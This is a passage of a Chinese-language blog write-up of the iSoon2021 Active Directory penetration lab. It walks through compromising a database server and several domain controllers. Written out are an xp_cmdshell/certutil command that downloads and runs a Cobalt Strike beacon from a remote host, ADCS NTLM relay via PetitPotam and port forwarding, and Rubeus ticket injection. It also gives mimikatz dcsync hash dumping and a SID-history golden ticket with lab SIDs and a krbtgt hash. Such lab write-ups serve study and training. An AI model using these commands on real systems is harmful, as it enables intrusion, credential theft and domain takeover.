<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_cmdshell '<span class="keyword">cd</span> c:\\<span class="keyword">test</span> &amp; certutil -urlcache -<span class="keyword">split</span> -f http:<span class="comment">//10.10.211.142/beacon999.exe';</span></span><br></pre></td></tr></table></figure>

<p>执行程序，反弹到CS上操作。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> master.dbo.xp_cmdshell <span class="string">'cd c:\\test &amp; beacon999.exe'</span>;</span><br></pre></td></tr></table></figure>

<p>Network Service(<strong>NT AUTHORITY\Network Service</strong>)属于Windows服务的登陆账户，拥有<strong>SeImpersonatePrivilege</strong>权限，所以这里是可以利用potato进行提权操作。</p>
<p>但是这里需要注意要提权的机器是不出网的，所以我们这里要想反弹shell，还需要经过端口转发或者在入口点经过http代理上线CS或者MSF。</p>
<p><a href="https://p1.ssl.qhimg.com/t01e1e58502fbe508cb.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01e1e58502fbe508cb.png" alt="img"></a></p>
<p>这里其实不提权也可以，不妨碍对域进行攻击。</p>
<h2 id="0x05-dc2-net-iSoon2021-lab"><a href="#0x05-dc2-net-iSoon2021-lab" class="headerlink" title="0x05 dc2.net.iSoon2021.lab"></a>0x05 dc2.net.iSoon2021.lab</h2><p>简单域信息收集。发现域内一共就三台机器，其中两台域控，一台db服务器。</p>
<p><a href="https://p2.ssl.qhimg.com/t015d939f00a8b7057c.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t015d939f00a8b7057c.png" alt="img"></a></p>
<p>所以更多的往能够直接打域控的方式上靠。</p>
<p>常见的域提权方式:</p>
<ul>
<li>权限配置不当:ACL,DNSadmin,GPO等等</li>
<li>组策略GPP和SYSVOL中的密码</li>
<li>kerberosating</li>
<li>zerologon</li>
<li>ms14-068</li>
<li>基于委派的测试</li>
<li>printNightmare</li>
<li>relay</li>
</ul>
<p>如果这里信息收集没找到adcs服务的话:</p>
<p> 回到我们现在受控的db服务器上面进行信息收集，提到system权限后，然后降权，发现机器上面有火狐浏览器，降权之后抓一下历史记录，(或者直接3389连上去找)可以看到:</p>
<p><a href="https://p4.ssl.qhimg.com/t01eb5dfc3907273d41.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01eb5dfc3907273d41.png" alt="img"></a></p>
<p>访问发现是域证书服务，可以使用certutil命令来定位域内的CA服务器</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">certutil -CA</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01923e438527a12498.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01923e438527a12498.png" alt="img"></a></p>
<p> 发现在DC1上安装域证书服务，想到今年blackhat2021公开的关于ADCS的攻击方式，其中国内讨论较多的可能就是ADCS ESC8 也被叫做ADCS Relay，是目前ADCS里面利用最广的一个洞。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于<span class="keyword">ADCS的http证书接口没有启用NTLM中继保护，因此其易受NTLM </span>Relay攻击。而且Authorization HTTP 标头明确只允许通过 NTLM 身份验证，因此Kerberos协议无法使用。因此，攻击者可以利用NTLM Relay攻击<span class="keyword">ADCS证书服务。</span></span><br></pre></td></tr></table></figure>

<p>具体可以参考白皮书:</p>
<p><a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf" target="_blank" rel="noopener">https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf</a></p>
<p><strong>ADCS大致攻击思路:</strong></p>
<ul>
<li>攻击者利用漏洞，强制域控使用机器账户发起ntlm认证请求</li>
<li>之后将请求relay到证书服务的http接口，通过验证获得域机器账户的身份</li>
<li>利用证书模板为机器用户申请证书，方便之后持久性获取该用户权限</li>
<li>最后利用申请到的证书进行认证，就能拿到机器用户也就是域控的权限。</li>
</ul>
<p><strong>但是我们这里利用有几个问题需要解决:</strong></p>
<p> 一是我们这里探测发现打印机服务是关闭的，这里需要利用加密文件系统 (EFS) 的RPC协议。和之前的<code>printer bug</code>利用类似，EFS 的 rpc，允许恶意<code>域用户/或机器账号</code>控制<code>其它机器</code>外发认证.</p>
<p> 二是我们这里想要进行relay攻击需要利用工具来监听本地445端口，而在windows上445端口是占用的，并且目标机器在内网，且不出网，所以我们这里需要进行流量重定向和端口转发操作。</p>
<p>如果受控机上线了CS，可以直接使用PortBender这个插件:</p>
<p><a href="https://www.freebuf.com/articles/network/305106.html" target="_blank" rel="noopener">PortBender：一款功能强大的TCP端口重定向工具 – FreeBuf网络安全行业门户</a></p>
<p>首先把受控机的445端口流量重定向到受控机自己的8445端口，</p>
<p>首先需要把驱动传到当前shell目录下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">upload</span> <span class="selector-tag">xxxx</span><span class="selector-class">.sys</span></span><br></pre></td></tr></table></figure>

<p>执行重定向</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PortBender redirect <span class="number">445</span> <span class="number">8445</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p3.ssl.qhimg.com/t01ad73f391ee6089b9.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01ad73f391ee6089b9.png" alt="img"></a></p>
<p>然后把受控机的8445端口转发到黑客机器的445端口上，</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd <span class="number">8445</span> attackip <span class="number">445</span></span><br></pre></td></tr></table></figure>

<p>最后攻击者机器利用受控机的socks代理开启impacket监听：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 ntlmrelayx.py -t http:<span class="regexp">//</span><span class="number">10.1</span>.<span class="number">16.82</span><span class="regexp">/certsrv/</span>certfnsh.asp -smb2support --adcs --template <span class="string">'domain controller'</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t01684af56b89590304.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t01684af56b89590304.png" alt="img"></a></p>
<p>如果没上cs的话，可以用</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Arno0x/</span>DivertTCPconn</span><br></pre></td></tr></table></figure>

<p>在域外机器上利用netsh端口转发，将本地的8445转发到攻击者机器上的445上</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh<span class="built_in"> interface </span>portproxy <span class="builtin-name">add</span> v4tov4 <span class="attribute">listenaddress</span>=0.0.0.0 <span class="attribute">listenport</span>=8445 <span class="attribute">connectaddress</span>=attackip <span class="attribute">connectport</span>=445</span><br><span class="line">netsh<span class="built_in"> interface </span>portproxy show all</span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t01a038564382347292.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01a038564382347292.png" alt="img"></a></p>
<p>一样将本机445端口流量重定向到8445上</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">divertTCPConn.exe <span class="number">445</span> <span class="number">8445</span> debug</span><br></pre></td></tr></table></figure>

<p>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.exe <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span> <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p0.ssl.qhimg.com/t010214b0426209bf70.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t010214b0426209bf70.png" alt="img"></a></p>
<p>最后我们利用上面获取到的证书，使用Rubeus.exe获取tgt并注入：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt <span class="string">/user</span><span class="function">:DC2</span>$ <span class="string">/certificate</span>:打印出来的base64证书数据 <span class="string">/ptt</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p1.ssl.qhimg.com/t0185e6c000f9eb4e0d.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t0185e6c000f9eb4e0d.png" alt="img"></a></p>
<p>最后可以利用mimikatz，进行导出hash</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">"lsadump::dcsync /all /csv /domain:net.iSoon2021.lab"</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t0187cf65921ff18fd4.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0187cf65921ff18fd4.png" alt="img"></a></p>
<p>拿到导出的域管hash,pth横向依此拿到dc2和dc1上的flag。</p>
<h2 id="0x06-dc1-net-iSoon2021-lab"><a href="#0x06-dc1-net-iSoon2021-lab" class="headerlink" title="0x06 dc1.net.iSoon2021.lab"></a>0x06 dc1.net.iSoon2021.lab</h2><p>现在已经拿到子域域控的权限。</p>
<p><a href="https://p5.ssl.qhimg.com/t017e46e9f4a33dda49.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t017e46e9f4a33dda49.png" alt="img"></a></p>
<p>有个155的段，端口扫描可得:10.10.155.10 为父域控。</p>
<h2 id="0x07-dc-iSoon2021-lab"><a href="#0x07-dc-iSoon2021-lab" class="headerlink" title="0x07 dc.iSoon2021.lab"></a>0x07 dc.iSoon2021.lab</h2><p><strong>关于sid history</strong></p>
<p> 当同林下创建新域时, EA 组的 SID 固定为根域的 SID, 组 ID 也是固定的 519, 此时, 如果用 EA 组的 SID 设置 SIDHistory 属性并和金票结合,那么一旦当我们拿到了林中任意一个域的 krbtgt NTLM, 即可实现到同林根域的 “跨域金票”拿到了根域,也就等于变相拿到林中的所有其它域,因为林根源对同林下所有域都有管理权。</p>
<ul>
<li>同一个域林中, 林根域和其它树根域之间会自动建立可传递的双向信任关系</li>
<li>同一个域树中, 父域和子域之间会自动建立可传递的双向信任关系</li>
<li>不同林之间为了实现资源共享, 也可手动建立信任关系, 这种信任关系可以是双向, 也可是单向, 具体依据实际配置而定</li>
</ul>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest <span class="string">/domain_trusts</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p0.ssl.qhimg.com/t01440d49c5022ccff0.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t01440d49c5022ccff0.png" alt="img"></a></p>
<p>从上面的命令可以看出来，父域和子域是存在双向的信任关系。</p>
<p>通过生成SIDHistory 版黄金票据完成对父域的提权。<br>这里首先需要获取以下参数:</p>
<ul>
<li>/user 要伪造的用户,通常直接 administrator</li>
<li>/domain 当前子域名 FQDN</li>
<li>/sid 当前子域 sid</li>
<li>/krbtgt 当前子域 krbtgt ntlm hash</li>
<li>/sids 根域 sid + EA 组 id(默认 519)</li>
</ul>
<p>这里可以使用powerview+mimikatz收集。</p>
<p>之后创建票据并注入，命令：</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "kerberos::golden /user:administrator /domain:net.iSoon2021.lab /sid:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-1313431314</span><span class="string">-2338497662</span><span class="string">-1182907679</span> /krbtgt:d5e25ff9a650238a511f95076a1288d3 /sids:S<span class="string">-1</span><span class="string">-5</span><span class="string">-21</span><span class="string">-3103963290</span><span class="string">-13490155</span><span class="string">-3681442193</span><span class="string">-519</span> /ptt""exit"</span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t01116eaf3d9ab9cfc5.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01116eaf3d9ab9cfc5.png" alt="img"></a></p>
<p>用主机名访问，不然会出错，访问父域成功</p>
<p><a href="https://p4.ssl.qhimg.com/t01b7a9caca077daaf5.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01b7a9caca077daaf5.png" alt="img"></a></p>
<p>使用mimikatz导出根域的hash</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">"lsadump::dcsync /domain:iSoon2021.lab /all /csv"</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p2.ssl.qhimg.com/t014931ec03866cfe1f.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t014931ec03866cfe1f.png" alt="img"></a></p>
<p>pth上线父域控，C盘根目录下读flag。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.4hou.com/posts/n6Z7" target="_blank" rel="noopener">【技术原创】Confluence利用指南 – 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com</a></p>
<p><a href="https://www.c0bra.xyz/2021/02/17/域渗透-SID-History权限维持及域信任攻击/" target="_blank" rel="noopener">域渗透-SID History权限维持及域信任攻击 – gakkkkkkiii (c0bra.xyz)</a></p>
<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate" target="_blank" rel="noopener">ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate – Red Teaming Experiments (ired.team)</a></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="https://shu1l.github.io">Shu1L</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="https://shu1l.github.io/2022/01/27/isoon2021-xian-xia-yu-shen-tou-ti-jie/">https://shu1l.github.io/2022/01/27/isoon2021-xian-xia-yu-shen-tou-ti-jie/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
            </div>
        
        <nav class="post-nav"><a class="next" href="/2021/10/29/adcs-zhong-de-ntlm-relay/">
        <span class="next-text nav-default">ADCS中的ntlm relay</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:hackshu1l@gmail.com" class="iconfont icon-email" title="email"></a>
        <a href="https://github.com/Shu1L" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2022<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">Shu1L</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><!-- SOHUCS Comments -->
<div id="SOHUCS"></div>
<script type="text/javascript">
(function(){
var appid = 'ScCGwbdkMqPLbNHvh2QCuo4h-gzGzoHsz';
var conf = '5KOK9KOQQT1AL9PmmwexKn2O';
var width = window.innerWidth || document.documentElement.clientWidth;
if (width < 960) {window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })();
</script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
